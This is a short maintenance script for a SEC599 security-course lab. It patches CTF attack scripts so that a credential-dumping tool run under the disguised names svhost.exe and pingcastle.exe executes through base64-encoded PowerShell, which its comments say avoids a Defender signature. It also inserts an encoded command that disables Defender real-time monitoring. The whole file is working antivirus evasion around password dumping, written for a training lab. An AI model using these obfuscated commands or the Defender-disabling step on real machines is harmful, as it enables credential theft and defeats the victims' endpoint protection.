# SEC599 Maintenance script for Kali DTF
# --------------------------------------
# Last update: 30 August 2019
# This script is used for emergency patches / updates in SEC599

# Issue description: A recent Defender update triggers on the following exact commandline combination: "privilege::debug sekurlsa::logonPasswords"
# Solution: Use PowerShell to avoid "privilege::debug" (PowerShell already has debug privilege)

# Fix for Windows01
/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAZAB3AGkAZwBoAHQALgBzAGMAaAByAHUAdABlAFwAXABEAG8AdwBuAGwAbwBhAGQAcwBcAFwAcwB2AGgAbwBzAHQALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='/g" /root/Desktop/CTF/4-movetowin01-INITIAL.sh
/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAZAB3AGkAZwBoAHQALgBzAGMAaAByAHUAdABlAFwAXABEAG8AdwBuAGwAbwBhAGQAcwBcAFwAcwB2AGgAbwBzAHQALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='/g" /root/Desktop/CTF/4-movetowin01-FINAL.sh

/bin/sed '2i\'$'\n''UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA='$'\n' /root/Desktop/CTF/4-movetowin01-INITIAL.sh
/bin/sed '2i\'$'\n''UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA='$'\n' /root/Desktop/CTF/4-movetowin01-FINAL.sh

# Fix for Windows02
/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAYQBsAGEAbgAuAG0AYQByAHMAaABhAGwAbABcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHMAdgBoAG8AcwB0AC4AZQB4AGUAIABzAGUAawB1AHIAbABzAGEAOgA6AGwAbwBnAG8AbgBQAGEAcwBzAHcAbwByAGQAcwAgAGUAeABpAHQA'/g" /root/Desktop/CTF/5-movetowin02-INITIAL.sh
/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAYQBsAGEAbgAuAG0AYQByAHMAaABhAGwAbABcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHMAdgBoAG8AcwB0AC4AZQB4AGUAIABzAGUAawB1AHIAbABzAGEAOgA6AGwAbwBnAG8AbgBQAGEAcwBzAHcAbwByAGQAcwAgAGUAeABpAHQA'/g" /root/Desktop/CTF/5-movetowin02-FINAL.sh

# Fix for DC
/bin/sed -i "s/'C:.*\\\\pingcastle.exe privilege::debug sekurlsa::krbtgt exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHAAaQBuAGcAYwBhAHMAdABsAGUALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='/g" /root/Desktop/CTF/6-movetodc-INITIAL.sh
/bin/sed -i "s/'C:.*\\\\pingcastle.exe privilege::debug sekurlsa::krbtgt exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHAAaQBuAGcAYwBhAHMAdABsAGUALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='/g" /root/Desktop/CTF/6-movetodc-FINAL.sh
